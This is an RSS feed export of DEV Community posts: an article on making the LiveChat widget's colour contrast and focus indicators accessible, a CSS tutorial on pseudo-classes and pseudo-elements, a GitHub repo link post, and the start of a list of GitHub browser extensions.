<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>How we made the chat widget accessible for people with visual impairments</title>
      <author>Oliwia Połeć</author>
      <pubDate>Thu, 24 Jun 2021 12:48:58 +0000</pubDate>
      <link>https://dev.to/livechat/how-we-made-the-chat-widget-accessible-for-people-with-visual-impairments-41d0</link>
      <guid>https://dev.to/livechat/how-we-made-the-chat-widget-accessible-for-people-with-visual-impairments-41d0</guid>
      <description>&lt;p&gt;Matching colors to achieve the minimum WCAG contrast score might be perceived as a simple task. After all, there are plenty of free tools available — from websites like &lt;a href="https://colourcontrast.cc/" rel="nofollow"&gt;colourcontrast&lt;/a&gt; to design tool plugins for &lt;a href="https://www.figma.com/community/plugin/748533339900865323/Contrast" rel="nofollow"&gt;Figma&lt;/a&gt; or &lt;a href="https://cluse.cc/" rel="nofollow"&gt;Sketch&lt;/a&gt; — that can help you calculate the proper color contrast for your designs. In our case the challenge was to solve contrast problems when colors can be customized by the users. In this article we want to share what we have learned and how we build accessible color palettes.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#where-to-start"&gt;
  &lt;/a&gt;
  Where to start?
&lt;/h2&gt;

&lt;p&gt;Start by doing an audit using Google Lighthouse, or you can find a tool that will fit your needs in this article. Gathering together issues related to low color contrast and grouping them into those which can be fixed quickly and those which will require special solutions was very helpful and speeded up the whole process. The low-hanging fruit was fixing the contrast between elements that don't inherit a primary color and also fixing the contrast between surfaces. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--R_JfnNcY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i7zp12yfg1v6ukkrm7d6.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--R_JfnNcY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i7zp12yfg1v6ukkrm7d6.png" alt="LiveChat accessibility color issues"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;They were easy to resolve because we decided that some components will always have a set of fixed color values, and thanks to that we can easily predict the contrast in relation to the different surfaces. By doing an audit and refining each element individually, we recreated our new grayscale palette.&lt;/p&gt;

&lt;p&gt;Do an audit using specialized tools, and group issues based on their level of difficulty.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#performance-over-preference"&gt;
  &lt;/a&gt;
  Performance over Preference
&lt;/h2&gt;

&lt;p&gt;Take a look at these two buttons:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--GzeduQG2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mf9zahxml9xm2w8fd3cy.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--GzeduQG2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mf9zahxml9xm2w8fd3cy.png" alt="LiveChat accessibility buttons comparison"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Which one is more appealing to you?&lt;/p&gt;

&lt;p&gt;I assume that the button on the left might look more appealing to most respondents; however, working with accessibility in mind is not a matter of preferences — it’s simply down to performance. If I want to measure the button's performance, my question should be: Do you have a problem reading any of those buttons? Then filter out everyone who can read both and focus only on people who have a hard time reading any of the buttons. There is a thin line in matching colors for the button such that they fulfill WCAG guidelines and the button still looks the way most people expect to see it. Those expectations of specific color combinations might exist because people just get used to them, but changing the combinations to have a contrast score of at least 4:5:1 won't bother anyone that much, and it might help others to better perceive the interface. Our eyes and vision change over time, just like the rest of our bodies. Some people experience age-related vision changes that interfere with their ability to see clearly for reading and other close vision tasks. We don't know what the exact demographic of chat widget end-users is. However, the chats' scale is approximately 1.5 million per day; so there was a risk that a significant number of users might have problems when interacting with the LiveChat Widget.&lt;/p&gt;

&lt;p&gt;It's important not to rely solely on the WCAG math for calculating contrast. You can strive for the best score and readability by tweaking colors, but at the end of the day, testing it with real users or doing the accredited accessibility audit is a must.&lt;/p&gt;

&lt;p&gt;Eliminate your personal bias on preferred color combinations and remember that you are designing it for ALL users.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--IRizmjJ0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/544h5q01ey0ya331mown.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--IRizmjJ0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/544h5q01ey0ya331mown.png" alt="LiveChat accessibility improved buttons"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#framer-polishedjs-to-the-rescue"&gt;
  &lt;/a&gt;
  Framer + polished.js to the rescue
&lt;/h2&gt;

&lt;p&gt;Nowadays, design tools offer several ways to solve inaccessible color problems. You can install a plugin to your favorite design tool and test many color combinations one by one. However, it might be a time-consuming task, especially if you provide color customization in your app, so why not automate this process? Framer, a tool that combines both code and design, was a lifesaver when designing elements that inherit primary colors. The tool allows you to use mechanisms that function in the actual code environment. We've used one of those available mechanisms, from the polished.js package. Thanks to this package, we could test for accessible colors on many components simultaneously.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--eMXhXIfH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qgc3gz28jedp52p66umm.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--eMXhXIfH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qgc3gz28jedp52p66umm.gif" alt="LiveChat accessibility framer colors"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can see how the components and the contrast score changes when tweaking the primary color. It speeds up the whole process dramatically. The cool thing is that we have also implemented this package inside the Chat Widget code, so the design and production are based on the same environment. The important thing is that when the user customizes the primary color of the widget, the system relies on the polished.js mechanism. This matches whichever text or icon color (black or white) scores the highest. Because of this, users might even get black text on a blue button if white text would only achieve a minimum 4:5:1 contrast ratio for that particular blue background. The way we measure combination contrast is not perfect, because the WCAG guidelines, as the name suggests, are just recommendations, and I believe that the proper math for color calculation that mirrors human perception is yet to be invented. Still, we think it’s better to have this automation than always having white be the foreground to a primary color.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5RBmIwxP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8p6kix9alsuf6cgbavol.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5RBmIwxP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8p6kix9alsuf6cgbavol.gif" alt="LiveChat color changing in Agent App"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#do-accessible-colors-have-to-be-ugly"&gt;
  &lt;/a&gt;
  Do accessible colors have to be ugly?
&lt;/h2&gt;

&lt;p&gt;Statements about ugly accessible colors might be a consequence of the high contrast modes you may have seen over time on various websites.&lt;/p&gt;

&lt;p&gt;It's easy to make a false assumption about accessible colors if you're just starting with the topic and you've seen too many of those websites. Another thing is that perceiving color is a subjective matter. When we think about the color being beautiful, it only exists in our heads as a pleasant feeling. However, a fairly useful method would be to observe the most popular colors on the web. I think that for the sake of argument, we can call popular colors appealing. After all, they are popular for a reason. Gather and refine those colors by increasing or decreasing their lightness so they will have a minimum 4:5:1 foreground to background contrast ratio. For example, if you want to fix an inaccessible color, decide whether you want to darken the background and lighten the foreground or do the opposite — lighten the background and darken the foreground. Both ways are good; use whatever works for your design to achieve a good contrast score.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--uveQiy_x--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mbx2aks9y0nq9rxagtci.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--uveQiy_x--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mbx2aks9y0nq9rxagtci.png" alt="LiveChat accessibility high contrast mode"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We have decided to make the theme colors slightly darker so that all our predefined theme colors work well as a background to a white foreground. We didn't want to include colors with high luminance, like yellow or orange, in a predefined set of colors because combining them with white surfaces results in low contrast. Users still have a choice if none of those five colors meet their expectations. They can pick whatever color they want as a primary color, and we will adjust the text color on the messages and buttons. Achieving the proper text color is done automatically by the polished.js library. In short, whatever color you pick, polished will match the text color, white or black, depending on which combination contrast score is the highest.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ZptCyyCQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/re5s7teko8v6xzznegr2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ZptCyyCQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/re5s7teko8v6xzznegr2.png" alt="LiveChat accessibility predefined colors"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#two-problems-at-once"&gt;
  &lt;/a&gt;
  Two problems at once
&lt;/h2&gt;

&lt;p&gt;Working on accessible colors in LiveChat Widget was an excellent opportunity to tidy up the code and create a single source of truth for design tokens. The term “design tokens” refers to properties like colors, font sizes, spacings, and even transitions. The main premise of having organized design tokens, especially colors, is to maintain consistency within the application. Synchronizing colors between design and code will also help you keep the product palette accessible (automated checks) and predictable; so if you have the opportunity to do that, go for it!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#pay-attention-to-focus"&gt;
  &lt;/a&gt;
  Pay attention to :focus
&lt;/h2&gt;

&lt;p&gt;You are probably familiar with that blue border that appears from time to time when you scroll through websites. Those elements are called focus indicators. Some people don't like that browsers add them by default to components like inputs or buttons because it interferes with their website/app design, so they remove them in the CSS. If you want to build an inclusive product, you should not use &lt;code&gt;{ outline: none; }&lt;/code&gt; on focusable elements globally for the whole website or app. Instead of deleting the outline completely, you can show a focus indicator that originates from keyboard interaction but that is not present with pointer device interaction. Also, make sure that the color you use for the focus indicator properly contrasts with the backgrounds. It is also good to add a small gap between the focused element and the component using the &lt;code&gt;{ outline-offset }&lt;/code&gt; property for better visibility.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ry--42iH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6ybaxksawk9c9pw3urir.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ry--42iH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6ybaxksawk9c9pw3urir.png" alt="LiveChat accessibility buttons focus"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#wrapup"&gt;
  &lt;/a&gt;
  Wrap-up
&lt;/h2&gt;

&lt;p&gt;You may be overwhelmed by the number of color issues the audit can reveal; but don’t worry, very often the same color relations are repeated across the app. Like in any other case, planning is very important. Break down all issues into groups and categorize them based on similarity and difficulty. Choose your tools when it comes to design, development, and testing. There are plenty of tools and libraries which can speed up the whole process.&lt;/p&gt;

&lt;p&gt;Key takeaways:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Start with an audit&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Eliminate personal bias toward preferred colors&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Don’t rely solely on the WCAG math for contrast calculations. Test the combinations with real users&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Accessible color palettes can be appealing&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Working on accessible colors is an opportunity to tidy up your design system&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Create a proper focus indicator and show it when needed&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>a11y</category>
      <category>showdev</category>
      <category>webdev</category>
    </item>
    <item>
      <title>List of Best GitHub Repos for Web Developers</title>
      <author>Stacksjar</author>
      <pubDate>Thu, 24 Jun 2021 12:44:10 +0000</pubDate>
      <link>https://dev.to/stacksjar/list-of-best-github-repos-for-web-developers-2jip</link>
      <guid>https://dev.to/stacksjar/list-of-best-github-repos-for-web-developers-2jip</guid>
      <description>&lt;p&gt;In this post we are going to check best GitHub Repositories for Web Developers to learn fundamentals of Coding and Boost Productivity. List of the most Useful GitHub Repos are as below&lt;/p&gt;

&lt;p&gt;Read Complete Article Here:- &lt;a href="https://stacksjar.com/post/best-github-repos-for-web-developers"&gt;https://stacksjar.com/post/best-github-repos-for-web-developers&lt;/a&gt;&lt;/p&gt;

</description>
      <category>github</category>
      <category>webdev</category>
      <category>tutorial</category>
      <category>productivity</category>
    </item>
    <item>
      <title>Pseudo-classes and pseudo-elements </title>
      <author>Garima</author>
      <pubDate>Thu, 24 Jun 2021 12:27:32 +0000</pubDate>
      <link>https://dev.to/garimasharma/pseudo-classes-and-pseudo-elements-npp</link>
      <guid>https://dev.to/garimasharma/pseudo-classes-and-pseudo-elements-npp</guid>
      <description>&lt;p&gt;CSS provide useful selector types that focus on specific platform state, like when the element is hovered, active etc.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#pseudoclasses"&gt;
  &lt;/a&gt;
  Pseudo-Classes
&lt;/h2&gt;

&lt;p&gt;HTML here find themselves in various stages either because they are interacted with user or one of their child element is in a certain state. &lt;/p&gt;

&lt;p&gt;For example, an HTML element could be hovered with the mouse pointer by a user or a child element could also be hovered by the user. For those situations, use the &lt;code&gt;:hover&lt;/code&gt; pseudo-class.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="c"&gt;/*When the link is hovered with a mouse pointer this code is fired*/&lt;/span&gt;
&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="nd"&gt;:hover&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="no"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nl"&gt;text-decoration&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;underline&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Pseudo-classes let you apply CSS based on state changes. This means that your design can react to user input and changes accordingly.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;For example &lt;br&gt;
you have an email signup form, you can change the border color of the field to red, if it contains invalid email address and green when it contains correct email address.&lt;/p&gt;

&lt;p&gt;As stated above pseudo-class let us apply CSS based on user input. Entering an email address is the input of the user. (whether right or wrong)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How do you do that?&lt;/strong&gt;&lt;br&gt;
Well, we have a pseudo-class &lt;code&gt;:invalid&lt;/code&gt;, this is one of many browser-provided &lt;strong&gt;pseudo-class&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/garima-sharma814/embed/MWpNWqJ?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;A pseudo-class lets you apply styles based on state changes and external factors. This means that your design can react to user input such as an invalid email address. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#interactive-states"&gt;
  &lt;/a&gt;
  Interactive States
&lt;/h3&gt;

&lt;p&gt;We can apply the following pseudo-classes on the interaction of a user with our page.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;:hover&lt;/strong&gt;
If the user is pointing to an element with a pointing device (can be a mouse), an they place it over an element, we can trigger the action of the user with &lt;code&gt;:hover&lt;/code&gt; class to apply different style when user &lt;em&gt;hovers&lt;/em&gt; on it.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/garima-sharma814/embed/mdWNdZZ?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;We can achieve this effect with little effort&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt; This is link &lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"#"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; Try hovering me! &lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="c"&gt;/*This line is to remove the default behavior of anchor tag we want underline effect one hover */&lt;/span&gt;
&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt; 
    &lt;span class="nl"&gt;text-decoration&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;none&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c"&gt;/*When the user hover on a tag this code will be fired*/&lt;/span&gt;
&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="nd"&gt;:hover&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;text-decoration&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;underline&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#8e44ad&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;:active&lt;/strong&gt;
This state is triggered when an element is actively being interacted with— such as a click—before click is released. If a pointing device like a mouse is used, this state is when the click starts and hasn't yet been released.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/garima-sharma814/embed/QWpewNd?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;We can achieve this effect with little effort&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;div&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Click and hold to see the active state&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nc"&gt;.btn&lt;/span&gt;&lt;span class="nd"&gt;:active&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nl"&gt;transform&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;scale&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0.99&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nl"&gt;box-shadow&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;none&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;There are tons of pseudo-classes for us to explore on. If you want to know more go to &lt;a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Pseudo-classes"&gt;Pseudo-classes&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#pseudoelements"&gt;
  &lt;/a&gt;
  Pseudo-Elements
&lt;/h2&gt;

&lt;p&gt;Pseudo-elements differ from pseudo-classes because instead of responding to the platform state, they act as if they are inserting a new element with CSS. Pseudo-elements are also syntactically different from pseudo-classes, because instead of using a single colon (:), we use a double colon (::).&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;A pseudo-element is like adding or targeting an extra element without having to add more HTML. &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;For example&lt;br&gt;
If you've got an article of content and you want the first letter to be a much bigger drop cap— how do you achieve that?&lt;/p&gt;

&lt;p&gt;In CSS, you can use the &lt;code&gt;::first-letter&lt;/code&gt; pseudo-element to achieve this sort of design detail.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="nd"&gt;::first-letter&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="no"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nl"&gt;float&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;left&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nl"&gt;font-size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;2.6em&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nl"&gt;font-weight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;bold&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nl"&gt;line-height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/garima-sharma814/embed/yLMmyjK?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;::before and ::after&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Both the &lt;code&gt;::before&lt;/code&gt; and &lt;code&gt;::after&lt;/code&gt; pseudo-elements create a child element inside an element only if you define a content property.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nc"&gt;.my-element&lt;/span&gt;&lt;span class="nd"&gt;::before&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nl"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;""&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nc"&gt;.my-element&lt;/span&gt;&lt;span class="nd"&gt;::after&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nl"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;""&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;::before&lt;/code&gt; pseudo-element to insert content at the start of an element, or the &lt;code&gt;::after&lt;/code&gt; pseudo-element to insert content at the end of an element.&lt;/p&gt;

&lt;p&gt;Pseudo-elements aren't limited to inserting content, though. We can also use them to target specific parts of an element.&lt;/p&gt;

&lt;p&gt;The content can be any string even an empty one but be mindful that anything other than an empty string will likely be announced by a screen reader. We can add an image &lt;code&gt;url&lt;/code&gt;, which will insert an image at its original dimensions, so we won't be able to resize it.&lt;/p&gt;

&lt;p&gt;There are tons of pseudo-classes for us to explore on. If you want to know more go to &lt;a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Pseudo-elements"&gt;Pseudo-Elements&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Written and Edited by &lt;a href="https://twitter.com/garimavatss"&gt;me&lt;/a&gt;❤.&lt;/p&gt;

</description>
      <category>css</category>
      <category>codenewbie</category>
      <category>beginners</category>
      <category>html</category>
    </item>
    <item>
      <title>Top 10 Useful GitHub Browser Extensions</title>
      <author>Abanoub Asaad</author>
      <pubDate>Thu, 24 Jun 2021 12:05:59 +0000</pubDate>
      <link>https://dev.to/abanoubasaad/top-10-useful-github-browser-extensions-2k2d</link>
      <guid>https://dev.to/abanoubasaad/top-10-useful-github-browser-extensions-2k2d</guid>
      <description>&lt;p&gt;There are many types of addiction, but addiction to GitHub is a unique and interesting one. Although GitHub is a great tool for developers, using extensions to increase your productivity is greater. Let's get started with the extensions that I'm using.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#1-octotree"&gt;
  &lt;/a&gt;
  1. &lt;a href="https://github.com/buunguyen/octotree"&gt;Octotree&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;It shows a side panel to enhance code review and exploration. Here, it is easy to navigate between the files and folders of the repository. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vMn0sVO2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ghqz5xcy6x8mjtnnfgc8.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vMn0sVO2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ghqz5xcy6x8mjtnnfgc8.png" alt="Octotree extension"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#2-enhanced-github"&gt;
  &lt;/a&gt;
  2. &lt;a href="https://github.com/softvar/enhanced-github"&gt;Enhanced GitHub&lt;/a&gt;
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;It displays : 

&lt;ul&gt;
&lt;li&gt;The whole repository size and each file size&lt;/li&gt;
&lt;li&gt;Download link&lt;/li&gt;
&lt;/ul&gt;


&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ri4gQWJD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/18s5fy33pnoyte4az807.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ri4gQWJD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/18s5fy33pnoyte4az807.png" alt="Enhanced GitHub screenshot0"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;You can copy file content directly to the clipboard.&lt;/li&gt;
&lt;/ul&gt;

